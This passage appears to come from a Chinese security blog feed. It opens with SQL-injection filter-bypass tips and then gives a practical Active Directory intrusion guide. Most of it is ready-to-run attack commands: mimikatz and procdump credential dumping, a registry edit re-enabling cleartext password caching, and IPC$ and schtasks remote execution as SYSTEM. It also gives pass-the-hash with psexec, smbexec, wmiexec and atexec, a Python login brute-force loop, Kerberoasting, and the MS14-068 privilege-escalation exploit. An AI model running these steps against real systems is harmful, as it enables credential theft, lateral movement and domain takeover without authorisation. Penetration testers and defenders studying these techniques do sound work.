<h3 id="过滤函数绕过">过滤函数绕过</h3>
<ul>
<li>sleep() --&gt;benchmark()</li>
</ul>
<pre><code class="language-sql">mysql&gt; select 12,23 and sleep(1);
+----+-----------------+
| 12 | 23 and sleep(1) |
+----+-----------------+
| 12 |               0 |
+----+-----------------+
1 row in set (1.00 sec)
1234567
# MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 
参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
mysql&gt; select 12,23 and benchmark(1000000000,1);
+----+--------------------------------+
| 12 | 23 and benchmark(1000000000,1) |
+----+--------------------------------+
| 12 |                              0 |
+----+--------------------------------+
1 row in set (4.61 sec)
123456789
</code></pre>
<ul>
<li>ascii()–&gt;hex()、bin()<br>
替代之后再使用对应的进制转string即可</li>
<li>group_concat()–&gt;concat_ws()</li>
</ul>
<pre><code class="language-sql">mysql&gt; select group_concat(&quot;str1&quot;,&quot;str2&quot;);
+-----------------------------+
| group_concat(&quot;str1&quot;,&quot;str2&quot;) |
+-----------------------------+
| str1str2                    |
+-----------------------------+
1 row in set (0.00 sec)

#第一个参数为分隔符
mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;);
+------------------------------+
| concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;) |
+------------------------------+
| str1,str2                    |
+------------------------------+
123456789101112131415
</code></pre>
<ul>
<li>substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</li>
<li>user() --&gt; @@user、datadir–&gt;@@datadir</li>
<li>ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</li>
</ul>
<h3 id="过滤if函数绕过">过滤IF函数绕过</h3>
<pre><code>case sex  when '1' then '男'  when '2' then '女’  else '其他' end
</code></pre>
<p>https://bbs.ichunqiu.com/thread-60004-1-1.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透]]></title>
        <id>https://Jrand-github.github.io/post/wen-dang-nei-wang-shen-tou/</id>
        <link href="https://Jrand-github.github.io/post/wen-dang-nei-wang-shen-tou/">
        </link>
        <updated>2021-07-02T12:05:11.000Z</updated>
        <content type="html"><![CDATA[<h1 id="域渗透">域渗透</h1>
<p>本文属于知识普及文章，未经允许，禁止转载（由于内容可能存在错误，不要转载误人子弟）</p>
<h2 id="基本介绍">基本介绍</h2>
<h3 id="基本架构图解">基本架构（图解）</h3>
<figure data-type="image" tabindex="1"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210602084420936.png" alt="image-20210602084420936" loading="lazy"></figure>
<h3 id="kerberos协议原理图解">Kerberos协议原理（图解）</h3>
<figure data-type="image" tabindex="2"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-1625227462308.png" alt="域渗透之白银票据黄金票据" loading="lazy"></figure>
<h3 id="ntlm认证图解">NTLM认证（图解）</h3>
<figure data-type="image" tabindex="3"><img src="lib/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件" loading="lazy"></figure>
<h2 id="信息收集">信息收集</h2>
<p>Github项目</p>
<pre><code>nishang
https://github.com/samratashok/nishang/releases/tag/v0.7.6

XenArmor(收集电脑密码，要钱的哦)
https://www.sdbeta.com/wg/2020/0514/234852.html

LaZagne（收集密码 免费）
https://github.com/AlessandroZ/LaZagne/releases

mimikatz
https://github.com/gentilkiwi/mimikatz/releases
</code></pre>
<h3 id="基本信息">基本信息</h3>
<pre><code>判断是否存在域环境
ifconfig /all
net time /domain 
systeminfo

查看域用户
whoami
systeminfo 详细信息*
net start 启动信息
tasklist 进程列表
schtasks 计划任务
</code></pre>
<h3 id="网络信息">网络信息</h3>
<pre><code>nslookup 域名 追踪来源地址*
net view /domain 判断存在域*
net time /domain 判断主域*
netstat -ano 当前网络端口开放
ipconfig /all 判断存在域-dns 
</code></pre>
<h3 id="用户信息">用户信息</h3>
<pre><code>系统默认常见用户身份：
Domain Admains：域管理员（默认对域控制器有完全控制权）
Domain Computers：域内机器
Domain Controllers：域控制器
Domain Guest：域访客，权限低
Domain users：域用户
Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权 ）

相关用户收集操作命令：
whoami /all 用户权限
net config workstation 登录信息
net user 当前电脑里面的用户（本地用户）
net localgroup 本地用户组
net user /domain 当前域里面的用户
net group /doamin 获取域用户组信息
wmic useraccount get /all 涉及域用户详细信息
net group &quot;Domain Admins&quot; /domain 查询域管理员账户
net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组
net group &quot;Domain Controllers&quot; /domain 查询域控制器
</code></pre>
<h3 id="凭据信息">凭据信息</h3>
<pre><code>计算机用户HASH，明文获取-mimikatz（win），mimipenguin（linux ）

mimikatz：
1.测试域控权限 
2.导出所有用户口令 
3.维持域控权限

1.站点源码备份文件，数据库备份文件等
2.各类数据库WEB管理入口，如PHPmyadmin
3.浏览器保存密码，浏览器cookies
4.其他用户会话，3389和ipc$连接记录，回收站内容
5.windows 保存的WIFI密码
6.网络内部的各种账号和密码，如：Emain，VPN，FTP，OA等
</code></pre>
<h3 id="域内环境">域内环境</h3>
<p>CMD命令(ping)</p>
<pre><code>for /l %i in (1,1,255) do @ ping 192.168.52.%i -w 1 -n 1|find /i &quot;ttl=&quot;
</code></pre>
<p>powershell</p>
<pre><code>nishang
https://github.com/samratashok/nishang/releases/tag/v0.7.6

导入模块nishang
Import-Module .\nishang.psml

设置执行策略
set-ExecutionPolicy RemoteSigned

获取模块nishang的命令函数
Get-Command -Module nishang

获取常规计算机信息
Get-information

端口扫描（查看目录对应文件又演示语法，其他同理）
Invoke-Portscan -startaddress 192.168.3.0 -Endaddress
192.168.3.100 -ResolveHost -ScanPort
</code></pre>
<p>工具</p>
<pre><code>nmap masscan
</code></pre>
<h2 id="凭证获取">凭证获取</h2>
<h3 id="rdp密码抓取">RDP密码抓取</h3>
<h3 id="内存密码抓取">内存密码抓取</h3>
<pre><code>无法获取明文密码解决方案
Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码
Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码

针对以上情况，我们提供了4种方式解决此类问题

1.利用哈希hash传递(pth，ptk等)进行移动
2.利用其它服务协议(SMB,WMI等)进行哈希移动
3.利用注册表操作开启Wdigest Auth值进行获取
4.利用工具或第三方平台(Hachcat)进行破解获取

Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。

注册表操作开启Wdigest Auth值
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</code></pre>
<h4 id="mimikatz直接获取">mimikatz直接获取</h4>
<pre><code>meterpreter导入mimikatz 很多时候会失败 最好自己上传
upload mimikatz.exe c:\\mimi.exe

提升权限
privilege::debug

获取明文密码
sekurlsa::LogonPasswords
</code></pre>
<h4 id="procdumpmimikatz配合">Procdump+Mimikatz配合</h4>
<p>Mimikatz属于第三方软件，直接上传到目标主机可能被杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p>
<p>Procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</p>
<p>procdump 在目标机上执行</p>
<pre><code>procdump -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<p>mimikatz 在本地执行：（对应目标的mimikatz32位或64位）</p>
<pre><code>sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
</code></pre>
<h3 id="sam文件hash值获取">sam文件hash值获取</h3>
<pre><code>privilege::debug
token::elevate
lsadump::sam
</code></pre>
<h3 id="暴力破解ntlm-hash">暴力破解NTLM Hash</h3>
<p>不现实：基于CMD5，或则国外关于这方面的在线破解</p>
<p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>
<pre><code>hashcat -a 0 -m 1000 hash file --force
</code></pre>
<p>破解工具：https://github.com/hashcat/hashcat<br>
更多参考：https://www.freebuf.com/sectool/164507.html</p>
<h3 id="域用户hash获取dsync">域用户HASH获取（dsync）</h3>
<pre><code>#获取所有域用户
lsadump::dcsync /domain:test.com /all /csv

#指定获取某个用户的hash
lsadump::dcsync /domain:test.com /user:test
</code></pre>
<p><a href="https://xie1997.blog.csdn.net/article/details/108988491">(7条消息) 域渗透之Dcsync_谢公子的博客-CSDN博客_dcsync</a></p>
<h2 id="横向渗透">横向渗透</h2>
<pre><code>impacket工具包
https://gitee.com/RichChigga/impacket-examples-windows

Pstools官方工具包
https://docs.microsoft.com/en-us/sysinternals/downloads/pstools

ladon（k8gege开发的内网工具）
https://github.com/k8gege/Ladon

hashcat
https://github.com/hashcat/hashcat
</code></pre>
<h3 id="模拟域控">模拟域控</h3>
<h4 id="ipc域共享管道">IPC（域共享管道）</h4>
<p>获取到某域主机权限-&gt;   minikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令</p>
<pre><code>IPC（ Internet Process Connection）是共享“命名管道”的资管，它是为了让进城间通信而开放的命名管道，可以通过验证用户名和密码获得相关的权限，在远程管路计算机和查看计算机的共享资源时使用。
利用流程：
 1.建立IPC链接到目标主机
 2.拷贝要执行的命令脚本到目标主机
 3.查看目标时间，创建计划任务（ at,schtasks ）定时执行拷贝到的脚本
 4.删除IPC链接
 net use \server\ipc$&quot;password&quot; /user:username # 工作组
 net use \server\ipc$&quot;password&quot; /user:domain\username #域内

 
 1.通过IPC读取C盘文件
 net K: \\192.168.52.138\c$
 
 2.查看文件列表
 dir \xx.xx.xx.xx\C$
 
 3.下载文件
 copy \xx.xx.xx.xx\C$\1.bat 1.bat 
 
 4.复制文件
  copy 1.bat \xx.xx.xx.xx\C$ 
 
 1. 查看对方共享
 net view xx.xx.xx.xx   
 
 6.删除IPC
 net use \xx.xx.xx.xx\C$\1.bat /del  
</code></pre>
<p>[at] &amp; [schtasks]</p>
<p>at &lt; Windows2012</p>
<pre><code>net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\ad
ministrator # 建立ipc连接：


copy add.bat \\192.168.3.21\c$  #拷贝执行文件到目标机器
at \\192.168.3.21 15:47 c:\add.bat   #添加计划任务
</code></pre>
<p>schtasks &gt;=Windows2012</p>
<pre><code>net use \192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\ad
ministrator # 建立ipc连接：


copy add.bat \192.168.3.32\c$ #复制文件到其C盘
schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
</code></pre>
<p>建立IPC常见的错误代码</p>
<pre><code>1. 5：错误访问，可能使用的不是管理员权限，需要先提升权限
2. 51：网络问题，windoows无法找到网络路径
3. 53：找不到网站路径，可能是IP地址错误，目标未开机，目标Lanmanserver服务未启动、有防火墙等问题
4. 67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$
5. 1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除
6. 1326：账号密码错误
7. 1792：目标NetLogon服务未启动，连接域控常常会出现此情况
8. 2242：用户密码过期，目标有账号策略，强制定期更改密码


建立IPC失败的原因
1. 目标系统不是NT或以上的操作系统
2. 对方没有打开IPC$共享
3. 对方未开启139,445端口，或者被防火墙屏蔽
4. 输出命令，账号密码有错误
</code></pre>
<h4 id="rdp协议传递">RDP协议传递</h4>
<p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p>
<p>RDP明文密码链接</p>
<pre><code>windows: mstsc 
mstsc.exe /console /v:192.168.3.21 /admin
linux: rdesktop 192.168.3.21:3389
</code></pre>
<p>RDP密文链接</p>
<p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了<code>2871997</code>、<code>2973351</code>补丁也支持；开启命令：</p>
<pre><code>REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
mstsc.exe /restrictedadmin

mimikatz.exe
privilege::debug
sekurlsa::pth /user:administrator /domain:tencent /ntlm:2baaefbdd1ee80755b986ee938848b2 &quot;/run:mstsc.exe /restrictedadmin&quot;
</code></pre>
<h4 id="psexec微软工具">Psexec（微软工具）</h4>
<pre><code>psexec.exe \\192.168.10.131 -u xie\test -p x123456./ cmd
</code></pre>
<figure data-type="image" tabindex="4"><img src="lib/20200329223246433.png" alt="img" loading="lazy"></figure>
<h4 id="wmiexec">wmiexec</h4>
<p>WMI(Windows Management Instrumentation) 是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。（可以执行命令）</p>
<p>第一种-自带WMIC命令 明文传递 无回显</p>
<pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c  ipconfig &gt;C:\1.txt&quot;
</code></pre>
<p>第二种-自带cscript配合wmiexec.vbs脚本 明文传递 有回显(wmiexec.vbs)</p>
<pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
</code></pre>
<p>第三种-第三方套件impacket wmiexec  明文或hash传递 有回显exe版本  容易被杀软查杀(wmiexec.exe)</p>
<p>https://blog.csdn.net/qq_27446553/article/details/46008473</p>
<pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;
</code></pre>
<p>wmiexec.vbs脚本下载</p>
<p>https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar</p>
<h4 id="smbexec">smbexec</h4>
<p>条件445服务端口开放</p>
<p>关于psexec进一步https://blog.csdn.net/tomyyyyyy/article/details/115782188</p>
<pre><code>psexec第一种：先有ipc链接，psexec需要明文或hash传递

net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator
psexec \\192.168.3.32 -s cmd # 需要先有ipc链接 -s以System权限运行

psexec第二种：不用建立IPC直接提供明文账户密码

psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd 
psexec -hashes :$HASH$ ./administrator@10.1.2.3
psexec -hashes :$HASH$ domain/administrator@10.1.2.3
psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32  // 实际操作中连接不上
// 以上两种方式使用的官方Pstools内的工具    
</code></pre>
<p>smbexec第三种：无需先ipc链接 明文或hash传递  非官方自带-参考impacket工具包使用，操作简单，容易被杀</p>
<pre><code>smbexec god/administrator:Admin12345@192.168.3.21
smbexec ./administrator:admin!@#45@192.168.3.32
smbexec -hashes :$HASH$ ./admin@192.168.3.21
smbexec -hashes :$HASH$ domain/admin@192.168.3.21
smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
</code></pre>
<p>Pstools官方工具包：https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</p>
<p>impacket工具包下载：https://gitee.com/RichChigga/impacket-examples-windows</p>
<h4 id="winrm">winrm</h4>
<p><a href="https://xie1997.blog.csdn.net/article/details/105122945">(7条消息) WinRM远程管理工具的使用_谢公子的博客-CSDN博客_winrm</a></p>
<h4 id="atexec">atexec</h4>
<pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;
</code></pre>
<p>升级版-明文HASH传递批量利用-综合</p>
<pre><code>FOR /F %%i in (ips.txt) do net use \%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测IP对应明文连接
FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测IP对应明文回显版
FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应IP回显版
FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测HASH对应IP回显版
</code></pre>
<p>升级版-明文HASH传递批量利用-升级版</p>
<pre><code>前期除了收集明文密码HASH等，还收集了用户名，用户名配合密码字典能吃西瓜？
net use \192.168.3.32\ipc$ admin!@#45 /user:god\dbadmin
</code></pre>
<p>python脚本</p>
<pre><code class="language-python">import os,time
ips={
   '192.168.3.21',
   '192.168.3.25',
   '192.168.3.29',
   '192.168.3.30',
   '192.168.3.31',
   '192.168.3.33'
}

users={
   'Administrator',
   'boss',
   'dbadmin',
   'fileadmin',
   'mack',
   'mary',
   'vpnadm',
   'webadmin'
}
passs={
   'admin',
   'admin!@#45',
   'Admin12345'
}

for ip in ips:
   for user in users:
       for mima in passs:
           exec=&quot;net use \&quot;+ &quot;\&quot;+ip+'\ipc$ '+mima+' /user:god\'+user
           print('---&gt;'+exec+'&lt;---')
           os.system(exec)
           time.sleep(1)
pip install pyinstaller
</code></pre>
<h4 id="哈希攻击">哈希攻击</h4>
<h5 id="横向移动pth-ntml传递">横向移动PTH NTML传递</h5>
<p>PTH(pass the hash) 利用LM或NTLM的值进行的渗透测试</p>
<p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
<p>如果禁用了NTLM认证，PsExec无法利用获得的NTLM  hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2安装补丁kb2871997的Win  7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现PTH攻击</p>
<p>总结：<code>KB2871997</code>补丁后的影响</p>
<pre><code>PTH：没打补丁用户都可以连接，打了补丁只能administrator连接
PTK：打了补丁才能用户都可以连接，采用aes256连接
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307170043249.png" alt="在这里插入图片描述" loading="lazy"></figure>
<p>未打补丁下的工作组及域连接：</p>
<pre><code>mimikatz 命令
privilege::debug           // #提升权限
sekurlsa::logonPasswords   // #抓取密码

sekurlsa::pth /user:administrator /domain:tencent /ntlm:2baaefbdd1ee80755b986ee93a8848b2
sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c
sekurlsa::pth /user:boss /domain:tencent /ntlm:ccef208c6485269c20db2cad21734fe7

上面反弹回来shell 查看域控的d盘信息
dir \\WIN-83V1721VG9V.tencent.com\d$    // 连接使用ip/域名都可以
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307181841429.png" alt="在这里插入图片描述" loading="lazy"></figure>
<p>2）PTK(pass the key) #利用的ekeys aes256进行的渗透测试</p>
<p>攻击方式同PTH，只是打了补丁后将NTML值换成aes256加密的值</p>
<p>3）PTT(pass the ticket) #利用的票据凭证TGT进行的渗透测试</p>
<p>PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p>
<p>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>
其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术<br>
MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
<h5 id="横向移动ptk-ntml传递">横向移动PTK NTML传递</h5>
<p>打<code>KB2871997</code>补丁后的工作组及域连接:</p>
<pre><code>mimikatz 命令
privilege::debug           // 提升权限
sekurlsa::ekeys            // 获取aes

sekurlsa::pth /user:administrator /domain:tencent /aes256:f305f03562f81f7847f17bcf9477cce414fb47e4271763cf9078cc2566316e0f
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307184007412.png" alt="在这里插入图片描述" loading="lazy"></figure>
<h5 id="横向移动ptt哈希票据传递">横向移动PTT哈希票据传递</h5>
<p>伪造本地票据（PTT）</p>
<p>这种方式是猜测当前电脑连接过域控，并且连接时长没有超过票据的过期时间（10小时）</p>
<p>mimikatz 命令</p>
<pre><code>privilege::debug           // 提升权限
sekurlsa::tickets /export   // 导出本地所有票据
kerberos::ptt xxxxxxxxxx.xxxx.kirbi  // 导入票据 
dir \\192.168.3.21\c$   // 利用
</code></pre>
<h3 id="域渗透独特的攻击">域渗透独特的攻击</h3>
<h4 id="委派攻击重点">委派攻击(重点)</h4>
<p><a href="https://www.redteaming.top/2020/02/11/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">域渗透——Kerberos委派攻击 | 七友 (redteaming.top)</a></p>
<h5 id="非约束委派攻击">非约束委派攻击</h5>
<figure data-type="image" tabindex="8"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221911770.png" alt="image-20210712221911770" loading="lazy"></figure>
<p>设置域内主机为非约束委派</p>
<figure data-type="image" tabindex="9"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221141559.png" alt="image-20210712221141559" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221511347.png" alt="image-20210712221511347" loading="lazy"></figure>
<p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code></p>
<p>为主机注册一个服务</p>
<pre><code>setspn -A https/apache2.4 STARS
</code></pre>
<p>域管理员登录 STARS</p>
<figure data-type="image" tabindex="11"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221305451.png" alt="image-20210712221305451" loading="lazy"></figure>
<p>导出当前票据</p>
<pre><code>privilege::debug 
sekurlsa::tickets /export
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221344097.png" alt="image-20210712221344097" loading="lazy"></figure>
<p>导入票据</p>
<pre><code>kerberos::ptt [0;140cb4]-2-0-60a10000-Administrator@krbtgt-JUN.SS.kirbi
kerberos::list
</code></pre>
<p>即可访问域控制器</p>
<p>查找域中配置非约束委派的用户：</p>
<pre><code>AdFind.exe -b &quot;DC=jun,DC=ss&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/wps1.jpg" alt="img" loading="lazy"></figure>
<p>查找域中配置非约束委派的主机</p>
<pre><code>1AdFind.exe -b &quot;DC=jun,DC=ss&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName
</code></pre>
<h5 id="约束委派攻击">约束委派攻击</h5>
<figure data-type="image" tabindex="14"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712222021426.png" alt="image-20210712222021426" loading="lazy"></figure>
<h5 id="基于资源的委派攻击">基于资源的委派攻击</h5>
<h4 id="kerberoast攻击spn扫描">Kerberoast攻击(SPN扫描)</h4>
<p>spn扫描也可以叫扫描Kerberos服务实例名称，在Active  Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。</p>
<pre><code>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。



Kerberoast攻击过程：

1.攻击者对一个域进行身份验证，然后从域控制器获得一个TGT认购权证 ，该TGT认购权证用于以后的ST服务票据请求。

2.攻击者使用他们的 TGT认购权证 发出ST服务票据请求(TGS-REQ) 获取特定形式（name/host）的 servicePrincipalName (SPN)。例如：MSSqlSvc/SQL.domain.com。此SPN在域中应该是唯一的，并且在用户或计算机帐户的servicePrincipalName 字段中注册。在服务票证请求(TGS-REQ)过程中，攻击者可以指定它们支持的Kerberos加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96等等)。

3.如果攻击者的 TGT 是有效的，则 DC 将从TGT认购权证 中提取信息并填充到ST服务票据中。然后，域控制器查找哪个帐户在 ServicedPrincipalName 字段中注册了所请求的 SPN。ST服务票据使用注册了所要求的 SPN 的帐户的NTLM哈希进行加密, 并使用攻击者和服务帐户共同商定的加密算法。ST服务票据以服务票据回复(TGS-REP)的形式发送回攻击者。

4.攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。
</code></pre>
<p>1）探针服务</p>
<pre><code>setspn -q */*
setspn -q */* | findstr &quot;MSSQL&quot;
</code></pre>
<p>2）请求获取票据</p>
<p>删除缓存票据</p>
<pre><code>klist purge
第一种 powershell请求
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;

第二种 mimikatz请求

mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;
</code></pre>
<p>查看票据</p>
<pre><code>klist
</code></pre>
<p>3）导出票据</p>
<p>mimikatz</p>
<pre><code>mimikatz.exe &quot;kerberos::list /export&quot;
</code></pre>
<p>4）破解票据</p>
<p>破解工具tgsrepcrack.py   python3环境运行</p>
<pre><code>python tgsrepcrack.py passwd.txt xxxx.kirbi
python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi
</code></pre>
<p>5）重写票据</p>
<pre><code>python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512

mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
</code></pre>
<p>6）利用</p>
<pre><code>dir //xxx.xxx.xxx.xxx/c$
</code></pre>
<h4 id="ntlm-relay">NTLM Relay</h4>
<pre><code>原理：诱骗受害者访问沦陷主机（我们获得NTLM）
</code></pre>
<h4 id="as-rep-rosating攻击">AS-REP Rosating攻击</h4>
<h3 id="dcshadow">DCshadow</h3>
<p>让域控复制伪造域控的内容</p>
<p><a href="https://zhuanlan.zhihu.com/p/37782341">域渗透：DCShadow攻击与利用 - 知乎 (zhihu.com)</a></p>
<h3 id="cve常用漏洞">CVE常用漏洞</h3>
<h4 id="cve-2014-6324">CVE-2014-6324</h4>
<p>powershell执行</p>
<p>能实现普通用户直接获取域控system权限</p>
<pre><code>1.查看当前sid 
whoami/user
2.清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
mimikatz # kerberos::purge         // 清空当前机器中所有凭证
mimikatz # kerberos::list          // 查看当前机器凭证
mimikatz # kerberos::ptc 票据文件   // 将票据注入到内存中
3.利用ms14-068生成TGT数据 
ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码
MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45
4.票据注入内存
mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit
5.查看凭证列表 
klist
6.利用  
dir \\192.168.3.21\c$
</code></pre>
<p>MS14-068下载：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</p>
<p>利用工具kekeo</p>
<p>工具kekeo下载：https://github.com/gentilkiwi/kekeo/releases</p>
<pre><code>1.生成票据
kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;
2.导入票据
kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
3.查看凭证 klist
4.利用net use载入
dir \\192.168.3.21\c$
</code></pre>
<h4 id="cve-2019-1040">CVE-2019-1040</h4>
